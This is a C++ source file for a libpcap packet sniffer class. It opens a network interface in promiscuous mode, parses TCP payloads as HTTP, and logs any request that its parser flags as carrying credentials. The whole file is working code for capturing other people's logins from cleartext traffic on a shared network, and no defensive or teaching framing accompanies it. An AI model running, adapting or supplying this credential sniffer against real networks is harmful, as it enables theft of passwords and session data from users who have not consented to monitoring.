#include "pcap_sniffer.h"

#include <iostream>

using namespace std;

PcapSniffer::PcapSniffer(
		string devName,
		unique_ptr<LoggerInterface> logger /* = make_unique<StdoutLogger>() */
	) :
	devName_(devName),
	logger_(move(logger))
{}

PcapSniffer::~PcapSniffer()
{
	if (nullptr != handle_) {
		pcap_freecode(&fp_);
		pcap_close(handle_);
	}
}

void PcapSniffer::HandlePacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	PcapSniffer *sniffer = reinterpret_cast<PcapSniffer*>(args);

	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	const char *payload;                    /* Packet payload */

	int size_ip;
	int size_tcp;
	int size_payload;

	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);

	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		return;
	}

	// HTTP is over TCP
	if (IPPROTO_TCP != ip->ip_p) {
		return;
	}

	// OK, this packet is TCP.
	//
	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;

	// invalid TCP header
	if (size_tcp < 20) {
		return;
	}

	/* define/compute tcp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	/* compute tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

	if (size_payload > 0) {
		try {
			Http http = sniffer->httpParser_.Parse(payload, size_payload);
			if (http.IsCredz()) {
				sniffer->logger_->Log(http);
			}
		} catch (...) {}
	}

	return;
}

void PcapSniffer::Start()
{
	OpenDevice();
	SetupFilter();

	/* now we can set our callback function */
	pcap_loop(handle_, 0, HandlePacket, reinterpret_cast<u_char*>(this));
}

void PcapSniffer::OpenDevice()
{
	char errbuf[PCAP_ERRBUF_SIZE];

	/* open capture device */
	handle_ = pcap_open_live(devName_.c_str(), SNAP_LEN, 1, 1000, errbuf);
	if (nullptr == handle_) {
		fprintf(stderr, "Couldn't open device %s: %s\n", devName_.c_str(), errbuf);
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle_) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", devName_.c_str());
		exit(EXIT_FAILURE);
	}
}

void PcapSniffer::SetupFilter()
{
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;				/* subnet mask */
	bpf_u_int32 net;				/* ip */
	char filter_exp[] = "ip";		/* filter expression [3] */

	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(devName_.c_str(), &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", devName_.c_str(), errbuf);
		net = 0;
		mask = 0;
	}

	/* compile the filter expression */
	if (pcap_compile(handle_, &fp_, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle_));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle_, &fp_) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle_));
		exit(EXIT_FAILURE);
	}
}

